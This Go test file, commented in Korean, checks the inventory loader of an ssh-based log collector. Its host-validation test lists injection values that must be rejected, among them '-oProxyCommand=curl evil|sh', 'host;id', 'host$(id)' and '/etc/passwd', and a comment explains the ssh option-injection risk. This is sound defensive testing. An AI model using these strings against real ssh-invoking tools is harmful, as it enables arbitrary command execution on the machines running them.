package inventory

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const validBody = `{
  "areas": [
    { "name": "requester", "hosts": ["kw41"],
      "sources": [{ "name": "app", "paths": ["/var/log/app.log*"] }] }
  ]
}`

func write(t *testing.T, dir, name, body string) string {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatalf("픽스처 작성 실패: %v", err)
	}
	return path
}

func TestLoadValid(t *testing.T) {
	path := write(t, t.TempDir(), "inventory.prod.json", validBody)

	inv, err := Load(path)
	if err != nil {
		t.Fatalf("예상치 못한 오류: %v", err)
	}
	// ssh_opts 가 없으면 기본값이 채워져야 한다.
	if len(inv.SSHOpts) == 0 {
		t.Error("ssh_opts 기본값이 채워지지 않았다")
	}
	if got, ok := inv.Find("requester"); !ok || got.Name != "requester" {
		t.Error("Find 가 requester 를 못 찾았다")
	}
	if _, ok := inv.Find("없는영역"); ok {
		t.Error("없는 영역이 찾아졌다")
	}
	if names := inv.Names(); len(names) != 1 || names[0] != "requester" {
		t.Errorf("Names 가 정의 순서를 안 지켰다: %v", names)
	}
}

func TestLoadRejectsBadShapes(t *testing.T) {
	cases := map[string]string{
		"areas 가 빔":         `{"areas":[]}`,
		"areas 가 아예 없음":     `{}`,
		"area 에 name 없음":    `{"areas":[{"hosts":["h"],"sources":[{"name":"a","paths":["p"]}]}]}`,
		"area 에 hosts 없음":   `{"areas":[{"name":"x","sources":[{"name":"a","paths":["p"]}]}]}`,
		"sources 가 빔":       `{"areas":[{"name":"x","hosts":["h"],"sources":[]}]}`,
		"source 에 paths 없음": `{"areas":[{"name":"x","hosts":["h"],"sources":[{"name":"a"}]}]}`,
		"JSON 이 아님":         `not json`,
	}
	dir := t.TempDir()
	for name, body := range cases {
		t.Run(name, func(t *testing.T) {
			path := write(t, dir, "bad.prod.json", body)
			if _, err := Load(path); err == nil {
				t.Error("거부되어야 하는 인벤토리가 통과했다")
			}
		})
	}
}

// TestLoadValidatesHosts 는 인벤토리에 적힌 호스트 형태를 검사한다.
//
// 접속 대상은 이 파일에서만 오므로 여기가 유일한 관문이다. "-" 로 시작하는
// 호스트는 ssh 가 옵션으로 파싱한다 — -oProxyCommand=... 하나로 수집기가
// 도는 머신에서 임의 명령이 실행된다.
func TestLoadValidatesHosts(t *testing.T) {
	dir := t.TempDir()

	body := func(host string) string {
		return `{"areas":[{"name":"x","hosts":["` + host + `"],` +
			`"sources":[{"name":"a","paths":["/var/log/a.log*"]}]}]}`
	}

	allowed := []string{"kr01kw41", "req-01", "host.example.com", "a_b", "A1"}
	for _, host := range allowed {
		if _, err := Load(write(t, dir, "ok.prod.json", body(host))); err != nil {
			t.Errorf("정상 호스트가 거부되었다 %q: %v", host, err)
		}
	}

	blocked := []string{
		"-oProxyCommand=curl evil|sh",
		"-i/tmp/key",
		"--flag",
		"host name",
		"host;id",
		"host$(id)",
		"",
		"..",
		"/etc/passwd",
	}
	for _, host := range blocked {
		if _, err := Load(write(t, dir, "bad.prod.json", body(host))); err == nil {
			t.Errorf("위험한 호스트가 통과되었다: %q", host)
		}
	}
}

// TestLoadRejectsDuplicateHosts 는 같은 호스트가 두 번 적힌 것을 잡는다.
// 그대로 두면 같은 줄이 두 번 수집되어 타임라인에 중복이 생긴다.
func TestLoadRejectsDuplicateHosts(t *testing.T) {
	body := `{"areas":[{"name":"x","hosts":["kw41","kw42","kw41"],` +
		`"sources":[{"name":"a","paths":["/var/log/a.log*"]}]}]}`
	_, err := Load(write(t, t.TempDir(), "dup.prod.json", body))
	if err == nil {
		t.Fatal("중복 호스트가 통과했다")
	}
	if !strings.Contains(err.Error(), "두 번") {
		t.Errorf("에러가 중복을 지적하지 않는다: %v", err)
	}
}

// TestLoadIgnoresUnknownFields 는 기존 파일의 _comment 나, 1차 범위에서
// 제외한 followup 블록이 들어 있어도 그대로 로드되는지 본다.
func TestLoadIgnoresUnknownFields(t *testing.T) {
	body := `{
  "_comment": ["설명 줄"],
  "environment": "예전 필드 — 이제 파일 이름이 환경을 나타낸다",
  "areas": [
    { "name": "scheduler", "hosts": ["kw47"],
      "sources": [{ "name": "app", "paths": ["/var/log/app.log*"] }],
      "followup": { "key": "content_id", "window_seconds": 600,
                    "sources": [{ "name": "mon", "paths": ["/var/log/mon.log*"] }] } }
  ]
}`
	path := write(t, t.TempDir(), "inventory.stage.json", body)
	if _, err := Load(path); err != nil {
		t.Fatalf("알 수 없는 필드 때문에 실패했다: %v", err)
	}
}

func TestResolve(t *testing.T) {
	dir := t.TempDir()
	base := filepath.Join(dir, "inventory.ai-stt")
	write(t, dir, "inventory.ai-stt.prod.json", validBody)
	write(t, dir, "inventory.ai-stt.stage.json", validBody)

	t.Run("기본 이름과 환경을 합친다", func(t *testing.T) {
		path, err := Resolve(base, "prod")
		if err != nil {
			t.Fatalf("예상치 못한 오류: %v", err)
		}
		if filepath.Base(path) != "inventory.ai-stt.prod.json" {
			t.Errorf("경로가 틀렸다: %s", path)
		}
	})

	t.Run(".json 이 붙어 있으면 떼고 쓴다", func(t *testing.T) {
		// 그게 없으면 inventory.ai-stt.json.prod.json 이 나온다.
		path, err := Resolve(base+".json", "prod")
		if err != nil {
			t.Fatalf("예상치 못한 오류: %v", err)
		}
		if filepath.Base(path) != "inventory.ai-stt.prod.json" {
			t.Errorf("경로가 틀렸다: %s", path)
		}
	})

	t.Run("없는 환경이면 쓸 수 있는 환경을 알려준다", func(t *testing.T) {
		_, err := Resolve(base, "dev")
		if err == nil {
			t.Fatal("없는 환경이 통과했다")
		}
		msg := err.Error()
		for _, want := range []string{"inventory.ai-stt.dev.json", "prod", "stage"} {
			if !strings.Contains(msg, want) {
				t.Errorf("에러에 %q 가 없다: %v", want, msg)
			}
		}
	})

	t.Run("파일이 하나도 없으면 그것도 알려준다", func(t *testing.T) {
		_, err := Resolve(filepath.Join(dir, "없는서비스"), "prod")
		if err == nil {
			t.Fatal("없는 기본 이름이 통과했다")
		}
		if !strings.Contains(err.Error(), "하나도 없습니다") {
			t.Errorf("에러가 상황을 설명하지 않는다: %v", err)
		}
	})

	t.Run("디렉토리는 파일로 보지 않는다", func(t *testing.T) {
		if err := os.Mkdir(filepath.Join(dir, "inventory.ai-stt.qa.json"), 0o700); err != nil {
			t.Fatalf("디렉토리 생성 실패: %v", err)
		}
		if _, err := Resolve(base, "qa"); err == nil {
			t.Error("디렉토리가 인벤토리 파일로 통과했다")
		}
	})
}

func TestEnvironments(t *testing.T) {
	dir := t.TempDir()
	base := filepath.Join(dir, "inventory.ai-stt")
	write(t, dir, "inventory.ai-stt.prod.json", validBody)
	write(t, dir, "inventory.ai-stt.dev.json", validBody)
	write(t, dir, "inventory.ai-stt.stage.json", validBody)
	// 다른 서비스 파일은 섞이지 않아야 한다.
	write(t, dir, "inventory.live.prod.json", validBody)

	got := Environments(base)
	want := []string{"dev", "prod", "stage"}
	if len(got) != len(want) {
		t.Fatalf("환경 목록이 %v (기대 %v)", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("정렬된 환경 목록이 %v (기대 %v)", got, want)
			break
		}
	}

	if envs := Environments(filepath.Join(dir, "없는서비스")); len(envs) != 0 {
		t.Errorf("없는 기본 이름에 환경이 나왔다: %v", envs)
	}
}
